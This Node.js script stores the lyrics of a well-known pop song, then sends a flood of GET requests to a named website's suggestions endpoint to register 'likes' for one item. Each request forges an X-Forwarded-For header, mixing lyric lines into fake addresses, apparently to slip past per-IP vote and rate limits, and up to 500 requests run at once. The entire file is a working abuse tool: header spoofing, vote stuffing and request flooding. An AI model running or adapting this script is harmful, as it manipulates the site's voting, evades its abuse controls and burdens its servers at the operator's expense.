var request = require("request");
var lir = [];

lir.push("We're no strangers to love");
lir.push("You know the rules and so do I");
lir.push("A full commitment's what I'm thinking of");
lir.push("You wouldn't get this from any other guy");
lir.push("I just wanna tell you how I'm feeling");
lir.push("Gotta make you understand");
lir.push("Never gonna give you up");
lir.push("Never gonna let you down");
lir.push("Never gonna run around and desert you");
lir.push("Never gonna make you cry");
lir.push("Never gonna say goodbye");
lir.push("Never gonna tell a lie and hurt you");
lir.push("We've known each other for so long");
lir.push("Your heart's been aching but you're too shy to say it");
lir.push("Inside we both know what's been going on");
lir.push("We know the game and we're gonna play it");
lir.push("And if you ask me how I'm feeling");
lir.push("Don't tell me you're too blind to see");
lir.push("Never gonna give you up");
lir.push("Never gonna let you down");
lir.push("Never gonna run around and desert you");
lir.push("Never gonna make you cry");
lir.push("Never gonna say goodbye");
lir.push("Never gonna tell a lie and hurt you");
lir.push("Never gonna give you up");
lir.push("Never gonna let you down");
lir.push("Never gonna run around and desert you");
lir.push("Never gonna make you cry");
lir.push("Never gonna say goodbye");
lir.push("Never gonna tell a lie and hurt you");
lir.push("Never gonna give, never gonna give");
lir.push("(Give you up)");
lir.push("(Ooh) Never gonna give, never gonna give");
lir.push("(Give you up)");
lir.push("We've known each other for so long");
lir.push("Your heart's been aching but you're too shy to say it");
lir.push("Inside we both know what's been going on");
lir.push("We know the game and we're gonna play it");
lir.push("I just wanna tell you how I'm feeling");
lir.push("Gotta make you understand");
lir.push("Never gonna give you up");
lir.push("Never gonna let you down");
lir.push("Never gonna run around and desert you");
lir.push("Never gonna make you cry");
lir.push("Never gonna say goodbye");
lir.push("Never gonna tell a lie and hurt you");
lir.push("Never gonna give you up");
lir.push("Never gonna let you down");
lir.push("Never gonna run around and desert you");
lir.push("Never gonna make you cry");
lir.push("Never gonna say goodbye");
lir.push("Never gonna tell a lie and hurt you");
lir.push("Never gonna give you up");
lir.push("Never gonna let you down");
lir.push("Never gonna run around and desert you");
lir.push("Never gonna make you cry");

async function xd() {
    var limit = 500;
    var pending = 0;
    var iii = 0;
    var beg = parseInt(Math.random() * 252) + 1;
    for (let i = 1; i < 254; i++) {
        for (let j = 1; j < 254; j++) {
            beg = parseInt(Math.random() * 252) + 1;
            for (let k = 1; k < 254; k++) {
                if(pending < limit) {
                    iii++;
                    let options = {
                        method: 'GET',
                        url: 'https://ceapa.cool/suggestions/',
                        qs: {like: '613'},
                        headers: {'x-forwarded-for': "2001:1b8:85a3:813:1319:112e:" + lir[iii % lir.length] + ":" + beg + "." + i + "." + j + "." + k},
                        followRedirect: false
                    };
                    console.log("s: " + options.headers['x-forwarded-for']);
                    request(options, function (error, response) {
                        pending--;
                        console.log("r: " + options.headers['x-forwarded-for'] + ": " + (error ? error.message : response.statusCode));
                    });
                    pending++;
                }
                await new Promise(resolve => setTimeout(resolve, 1));
            }
        }
    }
}

xd();
